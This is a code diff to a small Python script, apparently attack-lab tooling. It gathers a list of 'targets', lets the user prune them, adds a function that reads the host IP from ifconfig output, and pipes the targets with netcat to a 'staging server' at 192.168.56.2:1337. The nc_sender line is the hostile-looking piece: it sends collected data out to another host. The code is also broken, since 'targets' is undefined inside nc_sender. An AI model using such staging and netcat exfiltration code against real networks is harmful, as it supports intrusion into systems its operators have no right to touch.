@@ -19,7 +19,7 @@ def get_targets():
     print(potential_targets)
     return potential_targets
 
-def get_unwawnted(potential_targets):
+def remove_unwanted(potential_targets):
 #given a list of potential targets, collect user input on which to remove from targets
 
 	x = 1
@@ -45,15 +45,29 @@ def get_unwawnted(potential_targets):
 	print(potential_targets)
 	return potential_targets
 
+def get_ip():
+#function to find the ip of the host device
+
+	#run ifconfig and store the output
+	call("ifconfig > ifconfig.txt", shell=True)
+	ifconfig = open("ifconfig.txt", "r")
+	ifconfig = ifconfig.read()
+
+	#regex pattern to find the ips
+	pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' 
+	ip = findall(pattern, ifconfig)
+	return ip[0]
+
 def nc_sender():
 #given a list of targets, send it to the staging server
 
-    sender = "echo " + targets + " | nc 192.168.56.2 1337"
+	sender = "echo " + targets + " | nc 192.168.56.2 1337"
 	subprocess.call(sender, shell=True)
 
 def main():
+	ip = get_ip()
 	potential_targets = (get_targets())
-	targets = get_unwawnted(potential_targets)
+	targets = remove_unwanted(potential_targets)
 	nc_sender()
 
 if __name__ == "__main__":
